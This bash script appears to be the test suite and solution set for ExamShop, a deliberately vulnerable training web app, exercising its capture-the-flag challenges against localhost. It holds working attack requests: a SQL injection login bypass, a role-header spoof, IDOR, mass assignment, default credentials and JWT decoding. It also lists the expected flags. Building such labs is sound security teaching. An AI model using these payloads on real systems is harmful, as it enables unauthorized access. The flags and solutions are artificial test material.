#!/bin/bash
# ExamShop Backend Vulnerability Tests
# Tests various security vulnerabilities for educational purposes

set -e

BASE_URL="http://localhost:3000"
TEMP_DIR=$(mktemp -d)

echo "======================================"
echo "ExamShop Vulnerability Test Suite"
echo "======================================"
echo ""

# Start server in background
echo "Starting server..."
cd "$(dirname "$0")"
node server.js > "$TEMP_DIR/server.log" 2>&1 &
SERVER_PID=$!
sleep 3

echo "Server started (PID: $SERVER_PID)"
echo ""

# Test counter
PASS=0
FAIL=0

test_challenge() {
    local num=$1
    local name=$2
    local expected_flag=$3
    local result=$4
    
    if echo "$result" | grep -q "$expected_flag"; then
        echo "✓ Challenge #$num: $name"
        ((PASS++))
    else
        echo "✗ Challenge #$num: $name (Flag not found)"
        ((FAIL++))
    fi
}

# Challenge #7: Default Credentials
echo "Testing Challenge #7: Default Credentials..."
LOGIN_RESULT=$(curl -s -X POST "$BASE_URL/api/auth/login" \
    -H "Content-Type: application/json" \
    -d '{"username":"admin","password":"admin123"}')
TOKEN=$(echo "$LOGIN_RESULT" | jq -r '.token')
test_challenge 7 "Default Credentials" "Login successful" "$LOGIN_RESULT"

# Challenge #8: Debug Endpoint Exposed
echo "Testing Challenge #8: Debug Endpoint Exposed..."
DEBUG_RESULT=$(curl -s "$BASE_URL/api/debug/info")
test_challenge 8 "Debug Endpoint" "EXAMSHOP{debug_endpoint_exposed}" "$DEBUG_RESULT"

# Challenge #2: Broken Admin Access
echo "Testing Challenge #2: Broken Admin Access..."
ADMIN_RESULT=$(curl -s "$BASE_URL/api/admin/dashboard" \
    -H "X-User-Role: admin" \
    -H "Authorization: Bearer $TOKEN")
test_challenge 2 "Admin Panel Bypass" "EXAMSHOP{admin_panel_unlocked}" "$ADMIN_RESULT"

# Challenge #1: IDOR in User Profile
echo "Testing Challenge #1: IDOR in User Profile..."
IDOR_RESULT=$(curl -s "$BASE_URL/api/users/1" \
    -H "Authorization: Bearer $TOKEN")
test_challenge 1 "IDOR Profile" "EXAMSHOP{idor_profile_exposed_2025}" "$IDOR_RESULT"

# Challenge #19: SQL Injection Login
echo "Testing Challenge #19: SQL Injection Login..."
SQLI_RESULT=$(curl -s -X POST "$BASE_URL/api/auth/login" \
    -H "Content-Type: application/json" \
    -d '{"username":"admin'\''--","password":"anything"}')
test_challenge 19 "SQL Injection Login" "Login successful" "$SQLI_RESULT"

# Challenge #9: Directory Listing
echo "Testing Challenge #9: Directory Listing..."
LISTING_RESULT=$(curl -s "$BASE_URL/api/files/list" \
    -H "Authorization: Bearer $TOKEN")
test_challenge 9 "Directory Listing" "EXAMSHOP{directory_listing_enabled}" "$LISTING_RESULT"

# Challenge #13: Hardcoded Secret
echo "Testing Challenge #13: Hardcoded Secret..."
test_challenge 13 "Hardcoded Secret" "super-secret-key-examshop-2025" "$DEBUG_RESULT"

# Challenge #15: JWT Sensitive Data
echo "Testing Challenge #15: JWT Sensitive Data..."
JWT_PAYLOAD=$(echo "$TOKEN" | cut -d. -f2 | base64 -d 2>/dev/null | jq .)
if echo "$JWT_PAYLOAD" | grep -q "passwordHash"; then
    echo "✓ Challenge #15: JWT Contains Sensitive Data"
    ((PASS++))
else
    echo "✗ Challenge #15: JWT Contains Sensitive Data"
    ((FAIL++))
fi

# Challenge #27: Weak Password Policy
echo "Testing Challenge #27: Weak Password Policy..."
WEAK_PASS_RESULT=$(curl -s -X POST "$BASE_URL/api/auth/register" \
    -H "Content-Type: application/json" \
    -d '{"username":"weaktest","email":"weak@test.com","password":"123"}')
if echo "$WEAK_PASS_RESULT" | grep -q "successful"; then
    echo "✓ Challenge #27: Weak Password Policy"
    ((PASS++))
else
    echo "✗ Challenge #27: Weak Password Policy"
    ((FAIL++))
fi

# Challenge #29: Mass Assignment on Registration
echo "Testing Challenge #29: Mass Assignment Admin..."
MASS_ASSIGN_RESULT=$(curl -s -X POST "$BASE_URL/api/auth/register" \
    -H "Content-Type: application/json" \
    -d '{"username":"hacker","email":"hacker@test.com","password":"pass123","role":"admin","balance":99999}')
if echo "$MASS_ASSIGN_RESULT" | grep -q '"role":"admin"'; then
    echo "✓ Challenge #29: Mass Assignment Admin"
    ((PASS++))
else
    echo "✗ Challenge #29: Mass Assignment Admin"
    ((FAIL++))
fi

# Get all challenges
echo ""
echo "Getting challenge list..."
CHALLENGES_RESULT=$(curl -s "$BASE_URL/api/scoring/challenges")
TOTAL_CHALLENGES=$(echo "$CHALLENGES_RESULT" | jq -r '.total')
echo "Total challenges available: $TOTAL_CHALLENGES"

# Get products
echo ""
echo "Getting products..."
PRODUCTS_RESULT=$(curl -s "$BASE_URL/api/products")
PRODUCT_COUNT=$(echo "$PRODUCTS_RESULT" | jq -r '.products | length')
echo "Total products: $PRODUCT_COUNT"
echo "First product: $(echo "$PRODUCTS_RESULT" | jq -r '.products[0].name')"

# Cleanup
echo ""
echo "======================================"
echo "Test Results"
echo "======================================"
echo "Passed: $PASS"
echo "Failed: $FAIL"
echo "Total:  $((PASS + FAIL))"
echo ""

# Stop server
kill $SERVER_PID 2>/dev/null || true
wait $SERVER_PID 2>/dev/null || true
rm -rf "$TEMP_DIR"

if [ $FAIL -eq 0 ]; then
    echo "✓ All tests passed!"
    exit 0
else
    echo "✗ Some tests failed"
    exit 1
fi
